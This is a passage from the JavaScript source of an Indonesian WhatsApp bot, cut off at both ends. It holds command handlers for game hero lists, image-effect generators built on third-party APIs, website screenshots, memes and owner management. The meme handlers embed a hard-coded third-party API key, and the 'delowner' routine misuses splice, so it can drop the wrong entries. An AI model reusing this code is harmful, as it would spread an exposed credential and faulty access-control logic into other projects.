│57 ▸ *yorn-4*
│58 ▸ *zill-3*
│59 ▸ *ignis-2*
│60 ▸ *lubu-2*
│61 ▸ *naloch-2*
│62 ▸ *sephera-3*
│63 ▸ *butterfly-5*
│64 ▸ *diaochan-4*
│65 ▸ *elandoor*
│66 ▸ *krizzix-2*
│67 ▸ *nina-2*
│68 ▸ *natalya-3*
│69 ▸ *veera-3*
│70 ▸ *violet-6*
│71 ▸ *yena-2*
│72 ▸ *yena-3*
│73 ▸ *krizziz*
│74 ▸ *nurad-7*
│75 ▸ *volkath*
│76 ▸ *volkath-2*
│77 ▸ *airi-4*
│78 ▸ *arduin-3*
│79 ▸ *enzo-3*
│80 ▸ *hayate-3*
│81 ▸ *krixi-3*
│82 ▸ *nurad-6*
│83 ▸ *quillen-3*
│84 ▸ *telannas-3*
│85 ▸ *wisp-2*
│86 ▸ *zip-2*
│87 ▸ *gildur-2*
│88 ▸ *ishar*
│89 ▸ *tulen-5*
│90 ▸ *amily-2*
│91 ▸ *annette-3*
│92 ▸ *arthur-2*
│93 ▸ *butterfly-4*
│94 ▸ *errol-2*
│95 ▸ *joker*
│96 ▸ *kahlii-2*
│97 ▸ *kilgroht*
│98 ▸ *lauriel-3*
│99 ▸ *nurad-5*
│100 ▸ *arduin-2*
│101 ▸ *darcy-2*
│102 ▸ *florentino-3*
│103 ▸ *noren*
│104 ▸ *quillen-2*
│105 ▸ *ryoma-5*
│106 ▸ *sephera-3*
│107 ▸ *violet-5*
│108 ▸ *airi-3*
│109 ▸ *diaochan-3*
│110 ▸ *diaochanlubu*
│111 ▸ *elsuroxie*
│112 ▸ *lindis-3*
│113 ▸ *taara-2*
│114 ▸ *toro-2*
│115 ▸ *tulen-4*
│116 ▸ *violet-4*
│117 ▸ *wonderwoman*
│118 ▸ *ybneth*
│119 ▸ *zill-2*
│120 ▸ *arum-2*
│121 ▸ *florentino-2*
│122 ▸ *liliana-4*
│123 ▸ *nurad-4*
│124 ▸ *yorn-3*
│125 ▸ *zip*
│126 ▸ *annette-2*
│127 ▸ *qi*
│128 ▸ *qi-2*
│129 ▸ *celica*
│130 ▸ *capheny-2*
│131 ▸ *diaochan-2*
│132 ▸ *elsu-2*
│133 ▸ *ilumia-2*
│134 ▸ *krixi-2*
│135 ▸ *narja-2*
│136 ▸ *nurad-3*
│137 ▸ *preyta*
│138 ▸ *telannas-2*
│139 ▸ *valhein*
│140 ▸ *veera-2*
│141 ▸ *veres-2*
│142 ▸ *yorn-2*
│143 ▸ *zephys-2*
│144 ▸ *airi-2*
│145 ▸ *annette*
│146 ▸ *baldum*
│147 ▸ *butterfly-3*
│148 ▸ *elsu-2*
│149 ▸ *errol*
│150 ▸ *fennik*
│151 ▸ *lauriel-2*
│152 ▸ *liliana-2*
│153 ▸ *liliana-3*
│154 ▸ *lindis-2*
│155 ▸ *nurad-2*
│156 ▸ *nakroth-2*
│157 ▸ *nakroth-3*
│158 ▸ *natalya-2*
│159 ▸ *raz-2*
│160 ▸ *ryoma-2*
│161 ▸ *slimz*
│162 ▸ *teemee*
│163 ▸ *tulen-2*
│164 ▸ *tulen-3*
│165 ▸ *violet-3*
│166 ▸ *wiro*
│167 ▸ *wukong-3*
│168 ▸ *wukong-4*
│169 ▸ *zill*
│170 ▸ *aleister*
│171 ▸ *alice*
│172 ▸ *arduin*
│173 ▸ *arthur*
│174 ▸ *azzenka*
│175 ▸ *batman*
│176 ▸ *butterfly-2*
│177 ▸ *cresh*
│178 ▸ *darcy*
│179 ▸ *diaochan*
│180 ▸ *enzo-3*
│181 ▸ *hayate-2*
│182 ▸ *jinna*
│183 ▸ *lubu*
│184 ▸ *nganga*
│185 ▸ *violet-2*
│186 ▸ *wukong-2*
│187 ▸ *zanis-2*
│188 ▸ *florentino*
│189 ▸ *gildur*
│190 ▸ *ignis*
│191 ▸ *naloch*
│192 ▸ *narja*
│193 ▸ *nakroth*
│194 ▸ *omen*
│195 ▸ *payna*
│196 ▸ *raz*
│197 ▸ *rourke*
│198 ▸ *roxie*
│199 ▸ *ryoma*
│200 ▸ *skud*
│201 ▸ *taara*
│202 ▸ *toro*
│203 ▸ *valhein*
│204 ▸ *veres*
│205 ▸ *violet*
│206 ▸ *wisp*
│207 ▸ *wukong*
│208 ▸ *wonderwoman*
│209 ▸ *xeniel*
│210 ▸ *yorn* 
│211 ▸ *zanis*
│212 ▸ *elsu*
│213 ▸ *flash*
│214 ▸ *hayate*
│215 ▸ *ilumia*
│216 ▸ *kahlii*
│217 ▸ *Krixi*
│218 ▸ *lauriel*
│219 ▸ *liliana*
│220 ▸ *lindis*
│221 ▸ *nina*
│222 ▸ *nurad*
│223 ▸ *natalya*
│224 ▸ *quillen*
│225 ▸ *richter*
│226 ▸ *sephera*
│227 ▸ *supermen*
│228 ▸ telannas*
│229 ▸ *thane*
│230 ▸ *airi*
│231 ▸ *amily*
│232 ▸ *arum*
│233 ▸ *astrid*
│234 ▸ *butterfly*
│235 ▸ *capheny*
│236 ▸ *enzo*
│237 ▸ *tulen*
│238 ▸ *veera*
│239 ▸ *yena*
│240 ▸ *ryoma-4*
│241 ▸ *zephys*
│242 ▸ *zuka*
│
╰────────────˧`) 
}
break
case'listwallpaperml': {
if (!text) return m.reply(`╭─▸ *LIST HERO*
│
├❖ *LIST*
│1 ▸ *aldous*
│2 ▸ *alice-2*
│3 ▸ *angela-2*
│4 ▸ *argus-2*
│5 ▸ *chou*
│6 ▸ *chou-2*
│7 ▸ *estes*
│8 ▸ *eudora*
│9 ▸ *eudora-2*
│10 ▸ *granger*
│11 ▸ *granger-2*
│12 ▸ *gusion-3*
│13 ▸ *hanabi-2*
│14 ▸ *hanzo*
│15 ▸ *helcurt*
│16 ▸ *layla-3*
│17 ▸ *lesley-4*
│18 ▸ *lunox-2*
│19 ▸ *odette-3*
│20 ▸ *saber*
│21 ▸ *thamuz*
│22 ▸ *vexana*
│23 ▸ *argus*
│24 ▸ *dyrroth*
│25 ▸ *esmeralda-2*
│26 ▸ *kadita-2*
│27 ▸ *lancelot*
│28 ▸ *leomord-2*
│29 ▸ *lylia*
│30 ▸ *vale*
│31 ▸ *valir*
│32 ▸ *xborg*
│33 ▸ *zhask*
│34 ▸ *alice*
│35 ▸ *alpha*
│36 ▸ *athena*
│37 ▸ *badang*
│38 ▸ *balmond*
│39 ▸ *bane*
│40 ▸ *diggie*
│41 ▸ *trunks*
│42 ▸ *fanny-2*
│43 ▸ *fanny-3*
│44 ▸ *freya*
│45 ▸ *guinevere*
│46 ▸ *gusion*
│47 ▸ *gusion-2*
│48 ▸ *hanabi*
│49 ▸ *harith*
│50 ▸ *harith-2*
│51 ▸ *hayabusa-2*
│52 ▸ *kadita*
│53 ▸ *kagura-2*
│54 ▸ *kagura-3*
│55 ▸ *karina-2*
│56 ▸ *kimmy*
│57 ▸ *layla-2*
│58 ▸ *leomord*
│59 ▸ *lesley-2*
│60 ▸ *lesley-3*
│61 ▸ *lunox*
│62 ▸ *nartis*
│63 ▸ *niya-2*
│64 ▸ *nana*
│65 ▸ *nana-2*
│66 ▸ *natalia*
│67 ▸ *natalia-2*
│68 ▸ *odette-2*
│69 ▸ *pharsa*
│70 ▸ *rafaela-2*
│71 ▸ *selena-2*
│72 ▸ *zilong*
│73 ▸ *alucard*
│74 ▸ *angela*
│75 ▸ *bruno*
│76 ▸ *change*
│77 ▸ *claude*
│78 ▸ *fanny*
│79 ▸ *hayabusa*
│80 ▸ *hilda*
│81 ▸ *hylos*
│82 ▸ *kagura*
│83 ▸ *karina*
│84 ▸ *karrie*
│85 ▸ *layla*
│86 ▸ *lesley*
│87 ▸ *lolita*
│88 ▸ *ninotaur*
│89 ▸ *ninsittar*
│90 ▸ *niya*
│91 ▸ *noskov*
│92 ▸ *odette*
│93 ▸ *rafaela*
│94 ▸ *selena*
│
╰────────────˧`) 
}
break

case'banneroflol':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2|banner*\n*Untuk List Banner Ketik .list${command}*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2|banner*\n*Untuk List Banner Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
m.reply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&banner=${m3}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listbanneroflol': {
if (!text) return m.reply(`"ahri-2",
"neeko",
"nocturne",
"shen-2",
"veigar",
"rakanayah-2",
"zoe-2",
"pantheon-2",
"rammus",
"udyr",
"darius-2",
"ekko-2",
"lablanc",
"leona",
"nissfotune",
"poppy",
"quinn",
"talon-2",
"akali-2",
"irelia-2",
"jinx-2",
"nordekaiser",
"pyke-2",
"renekton",
"rengar",
"sivir",
"sona",
"soraka",
"tristana",
"warwick",
"yuumi",
"ziggs",
"leesin",
"lulu",
"lux",
"naster-yi",
"norgana",
"nasus",
"pantheon",
"pyke",
"qiyana",
"rakan",
"rakanxayah",
"riven",
"shen",
"sylas",
"talon",
"teemo",
"thresh",
"tryndamere",
"varus",
"vayne",
"velkoz",
"vladimir",
"yasuo",
"zed",
"zoe",
"hecarim",
"heimerdinger",
"illaoi",
"irelia",
"ivern",
"janna",
"jarvan-iv",
"jax",
"jayce",
"jhin",
"jinx",
"kaisa",
"kalista",
"karma",
"karthus",
"kassadin",
"katarina",
"kayle",
"kayn",
"kennen",
"khazix",
"kindred",
"kled",
"kogmaw",
"aatrox",
"ahri",
"akali",
"alistar",
"amumu",
"anivia",
"annie",
"ashe",
"aurelionsol",
"azir",
"bard",
"blitzcrank",
"brand",
"braum",
"caitlyn",
"camille",
"cassiopeia",
"chogath",
"corki",
"darius",
"diana",
"drmundo",
"draven",
"ekko",
"elise",
"evelynn",
"ezreal",
"fiddlesticks",
"fiora",
"fizz",
"galio",
"gangplank",
"garen",
"gnar",
"gragas",
"graves"`)
}
break

case'dragonballfb':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|character*\n*Untuk List Character Ketik .list${command}*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|character*\n*Untuk List Character Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m.reply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&character=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listdragonballfb': {
if (!text) return m.reply(`╭─▸ *LIST CHARACTER*
│
├❖ *LIST*
│1 ▸ *caulifla*
│2 ▸ *cooler*
│3 ▸ *cumber*
│4 ▸ *hit*
│5 ▸ *kale*
│6 ▸ *kaminoren*
│7 ▸ *gokuui*
│8 ▸ *xenogokuss3*
│9 ▸ *xenogokuss4*
│10 ▸ *xenovegeta*
│11 ▸ *xenovegito*
│12 ▸ *android-18*
│13 ▸ *blackgoku*
│14 ▸ *bulma*
│15 ▸ *frieza*
│16 ▸ *gotenks-2*
│17 ▸ *kaio*
│18 ▸ *krillinandroid-18*
│19 ▸ *launch*
│20 ▸ *nutenroshi-2*
│21 ▸ *oldkai*
│22 ▸ *oolong*
│23 ▸ *pilaf*
│24 ▸ *tienshinhan*
│25 ▸ *trunks-3*
│26 ▸ *bardock*
│27 ▸ *gotenks*
│28 ▸ *nutenroshi*
│29 ▸ *piccolo*
│30 ▸ *songoku-2*
│31 ▸ *songoku-3*
│32 ▸ *songoten*
│33 ▸ *trunks-2*
│34 ▸ *vegeta-2*
│35 ▸ *vegito*
│36 ▸ *krillin*
│37 ▸ *najinbuu*
│38 ▸ *songohan*
│39 ▸ *songoku*
│40 ▸ *trunks*
│41 ▸ *vegeta*
│
╰────────────˧`)
}
break
case 'ssweb2': case'ssweb':
{
if (!args[0]) return m.reply(`Gunakan dengan cara ${prefix+command} type *url web*\n\nList type:\n1.hp\n2.pc\n3.tab\n\nContoh penggunaan : ${prefix+command} hp https://bit.ly/420u6GX`)
if (!args[1]) return m.reply(`Gunakan dengan cara ${prefix+command} type *url web*\n\nList type:\n1.hp\n2.pc\n3.tab\n\nContoh penggunaan : ${prefix+command} hp https://bit.ly/420u6GX`)
if (args[0] === 'hp'){
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!args[1]) return m.reply(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
m.reply(mess.wait)
let ss = await getBuffer(`https://aemt.me/sshp?url=${args[1]}`)
try{
await juna.sendMessage(m.chat, {image: ss, caption: "Done Bruhh"}, {quoted: m})
} catch (err){
m.reply(util.format(err))
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
 } else 
 if (args[0] === 'pc'){
 if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!args[1]) return m.reply(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
m.reply(mess.wait)
let ss = await getBuffer(`https://aemt.me/sspc?url=${args[1]}`)
try{
await juna.sendMessage(m.chat, {image: ss, caption: "Done Bruhh"}, {quoted: m})
} catch (err){
m.reply(util.format(err))
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
 } else 
 if (args[0] === 'tab'){
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!args[1]) return m.reply(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
m.reply(mess.wait)
let ss = await getBuffer(`https://aemt.me/sstab?url=${args[1]}`)
try{
await juna.sendMessage(m.chat, {image: ss, caption: "Done Bruhh"}, {quoted: m})
} catch (err){
m.reply(util.format(err))
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}else { 
 m.reply(`Mau type apa lu?\n\n1.hp\n2.pc\n3.tab\n\nContoh: ${prefix + command} hp https://bit.ly/420u6GX`)}
}
break
case "couple": case "ppcp":{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await fetchJson("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
m.reply(mess.wait)
let random = anu[Math.floor(Math.random() * anu.length)]
juna.sendMessage(m.chat,{image: {url: random.male,},caption: `Couple Male`,},{quoted: m,})
juna.sendMessage(m.chat,{image: {url: random.female,},caption: `Couple Female`,},{quoted: m,})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
//darkjokes
case'darkjokes': case'darkjoke':
{//fix bug
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
m.reply(mess.wait)
let darkjoke = await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=GataDios`)
try{
await juna.sendMessage(m.chat, {image: darkjoke, caption: "Tetap Tertawa Walaupun Cringe🗿"}, {quoted: m})
} catch (err){
m.reply(util.format(err))
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'meme': case'memeindo':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
m.reply(mess.wait)
let darkjoke = await getBuffer(`https://api.lolhuman.xyz/api/meme/memeindo?apikey=GataDios`)
try{
await juna.sendMessage(m.chat, {image: darkjoke, caption: "Nih ngab🗿"}, {quoted: m})
} catch (err){
m.reply(util.format(err))
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
//ephoto360
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text*`)
m.reply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
try {
await juna.sendMessage(m.chat, { image: { url: haldwhd }, caption: `ePhoto360 Maker`}, { quoted: m})
} catch (err) {
m.reply('Terjadi Kesalahan!')
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
//textpro menu
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas': case 'holographic':
case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': case 'karbon': case 'neonlight2': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': case '3dbox': 
case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dstone': case 'greenneon': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': case 'lion2': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike': case '3davengers': 
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': case 'whitebear': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text*`)
m.reply(mess.wait)
 let link
 if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
 if (/neonlight2/.test(command)) link = 'https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html'
 if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
 if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
 if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
 if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
 if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
 if (/whitebear/.test(command)) link = 'https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html'
 if (/holographic/.test(command)) link = 'https://textpro.me/holographic-3d-text-effect-975.html'
 if (/3davengers/.test(command)) link = 'https://textpro.me/create-3d-avengers-logo-online-974.html'
 if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
 if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
 if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
 if (/greenneon/.test(command)) link = 'https://textpro.me/green-neon-text-effect-874.html'
 if (/lion2/.test(command)) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'
 if (/3dbox/.test(command)) link = 'https://textpro.me/3d-box-text-effect-online-880.html'
 if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
 if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
 if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
 if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
 if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
 if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
 if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
 if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
 if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
 if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
 if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
 if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
 if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
 if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
 if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
 if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
 if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
 if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
 if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
 if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
 if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
 if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
 if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
 if (/karbon/.test(command)) link = 'https://textpro.me/carbon-text-effect-833.html'
 if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
 if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
 if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
 if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
 if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
 if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
 if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
 if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
 if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
 if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
 if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
 if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
 if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
 if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
 if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
 if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
 if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
 if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
 if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
 if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
 if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
 if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
 if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
 if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
 if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
 let anu = await maker.one_text_create(link, text)
 try{
 await juna.sendMessage(m.chat, {image: anu, caption: "TextPro 1 ✅"}, {quoted: m})
 } catch (err) {
 m.reply('Terjadi Kesalahan!')
 }
 if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
 }
 break
case 'addowner':{
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *@tag*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
ownerNumber.push(users)
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`Sukses`)
} else {
m.reply(`Gunakan dengan cara ${prefix + command} *@tag*`)
}}
break
case'delowner':{
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *@tag/jid*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
if (!ownerNumber.includes(users)) return m.reply(`Dia bukan owner`)
ownerNumber.splice(ownerNumber.indexOf(users, 1))
m.reply(`Sukses`)
} else {
m.reply(`Gunakan dengan cara ${prefix + command} *@tag*`)
}}
break

case 'inv': case 'me': case 'inventori': case 'inventory': case 'profile':{
